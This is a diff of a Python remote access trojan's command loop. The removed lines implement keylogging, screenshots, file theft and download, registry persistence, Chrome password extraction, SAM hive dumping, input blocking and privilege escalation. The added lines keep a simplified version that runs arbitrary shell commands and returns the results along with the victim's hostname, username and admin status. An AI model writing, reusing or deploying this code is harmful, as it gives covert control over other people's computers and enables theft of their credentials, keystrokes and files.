@@ -186,106 +186,44 @@ def unblock_peripherals():
         print(e)
 
 def get_system_info():
-    info = {
-        'os': platform,
-        'hostname': socket.gethostname(),
-        'username': os.getlogin(),
-        'is_admin': is_admin()
-    }
-    return info
+    try:
+        info = {
+            'os': platform,
+            'hostname': socket.gethostname(),
+            'username': os.getlogin(),
+            'is_admin': is_admin()
+        }
+        return json.dumps(info)  # Convert to JSON string
+    except Exception as e:
+        return json.dumps({
+            'os': 'Unknown',
+            'hostname': 'Unknown',
+            'username': 'Unknown',
+            'is_admin': False,
+            'error': str(e)
+        })
 
 def shell():
     while True:
-        command = reliable_recv()
-        print(command)
-        if command == 'quit':
-            break
-        elif command == 'sysinfo':
-            reliable_send(get_system_info())
-        elif command[:3] == 'cd ':
-            os.chdir(command[3:])
-        elif command[:6] == 'upload':
-            download_file(command[7:])
-        elif command[:8] == 'download':
-            upload_file(command[9:])
-        elif command[:3] == 'get':
-            try:
-                download_url(command[4:])
-                reliable_send('[+] Downloaded File From Specified URL!')
-            except:
-                reliable_send('[!!] Download Failed!')
-        elif command[:10] == 'screenshot':
-            screenshot()
-            upload_file('.screen.png')
-            os.remove('.screen.png')
-        # elif command[:6] == 'webcam':
-        #     capture_webcam()
-        #     upload_file('.webcam.png')
-        #     os.remove('.webcam.png')
-        elif command[:12] == 'keylog_start':
-            keylog = keylogger.Keylogger()
-            t = threading.Thread(target=keylog.start)
-            t.start()
-            reliable_send('[+] Keylogger Started!')
-        elif command[:11] == 'keylog_dump':
-            logs = keylog.read_logs()
-            reliable_send(logs)
-        elif command[:11] == 'keylog_stop':
-            keylog.self_destruct()
-            t.join()
-            reliable_send('[+] Keylogger Stopped!')
-        elif command[:11] == 'persistence':
-            try:
-                reg_name, copy_name = command[12:].split(' ')
-                persist(reg_name, copy_name)
-            except Exception as e:
-                reliable_send('[-] Persistence Error! ' + str(e))
-        elif command[:7] == 'sendall':
-            subprocess.Popen(command[8:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
-                             stdin=subprocess.PIPE)
-        elif command[:5] == 'check':
-            try:
-                if is_admin():
-                    reliable_send("[!!]Admin privileges" + ' platform: ' + platform)
-                else:
-                    reliable_send("[!]User privileges" + ' platform: ' + platform)
-            except:
-                reliable_send('Cannot Perform Privilege Check! Platform: ' + platform)
-        elif command[:5] == 'start':
-            try:
-                subprocess.Popen(command[6:], shell=True)
-                reliable_send('[+] Started!')
-            except:
-                reliable_send('[-] Failed to start!')
-        
-        
-        #still error in chrome_pass
-        elif command[:11] == 'chrome_pass':
-            chrome_passwords()
-
-        #peripherals toggle not yet tested
-        elif command[:8] == "inpblock":
-            block_peripherals()
-        elif command[:10] == "inpunblock":
-            unblock_peripherals()
-
-        elif command[:8] == 'sam_dump':
-            sam_dump, system_dump, security_dump = get_sam_dump()
-            reliable_send((sam_dump, system_dump, security_dump))
-        
-        elif command[:9] == 'privilege':
-            try:
-                result = privilege.priv()
-                reliable_send(result)
-            except Exception as e:
-                reliable_send('[-] Failed to escalate privilege!',e)
-
-        else:
-            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+        try:
+            command = reliable_recv()
+            if command == 'quit':
+                break
+            elif command == 'sysinfo':
+                reliable_send(get_system_info())
+            elif command[:3] == 'cd ':
+                try:
+                    os.chdir(command[3:])
+                    reliable_send(os.getcwd())
+                except Exception as e:
+                    reliable_send(str(e))
+            else:
+                execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                        stdin=subprocess.PIPE)
-            result = execute.stdout.read() + execute.stderr.read()
-            result = result.decode()
-            reliable_send(result)
+                result = execute.stdout.read() + execute.stderr.read()
+                reliable_send(result.decode())
+        except Exception as e:
+            reliable_send(str(e))
 
 def connect():
     while True:
